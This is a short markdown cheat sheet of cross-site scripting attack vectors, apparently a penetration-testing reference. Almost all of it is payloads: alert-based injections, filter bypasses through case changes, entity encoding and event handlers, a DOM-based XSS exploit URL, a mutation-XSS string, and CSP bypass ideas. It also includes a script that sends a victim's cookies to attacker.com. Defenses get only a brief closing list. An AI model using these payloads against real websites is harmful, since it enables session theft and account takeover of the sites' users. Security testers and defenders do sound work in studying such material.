---
title: XSS Techniques
description: Cross-Site Scripting attack vectors and bypasses
---

## Basic XSS Payloads

### Simple Alert
```html
<script>alert('XSS')</script>
```

### Image Tag
```html
<img src=x onerror=alert('XSS')>
```

### SVG
```html
<svg onload=alert('XSS')>
```

## Filter Bypasses

### Case Variation
```html
<ScRiPt>alert('XSS')</sCrIpT>
```

### Encoding
```html
<img src=x onerror="&#97;lert('XSS')">
```

### Event Handlers
```html
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
```

### No Quotes or Parentheses
```html
<script>alert`XSS`</script>
<svg onload=alert`XSS`>
```

## Advanced Techniques

### DOM-based XSS
Exploit client-side JavaScript that handles user input unsafely:

```javascript
// Vulnerable code
document.write(location.hash.substring(1));

// Exploit
http://example.com/#<script>alert('XSS')</script>
```

### Mutation XSS (mXSS)
Exploit differences in how browsers parse HTML:

```html
<noscript><p title="</noscript><img src=x onerror=alert('XSS')>">
```

### CSP Bypass
When Content Security Policy is in place:
- Use allowed domains
- Exploit JSONP endpoints
- Base tag injection
- Script gadgets

## Cookie Stealing

```javascript
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

## Defense

- Always sanitize user input
- Use Content Security Policy
- Set HttpOnly flag on cookies
- Escape output properly
- Use frameworks with built-in XSS protection
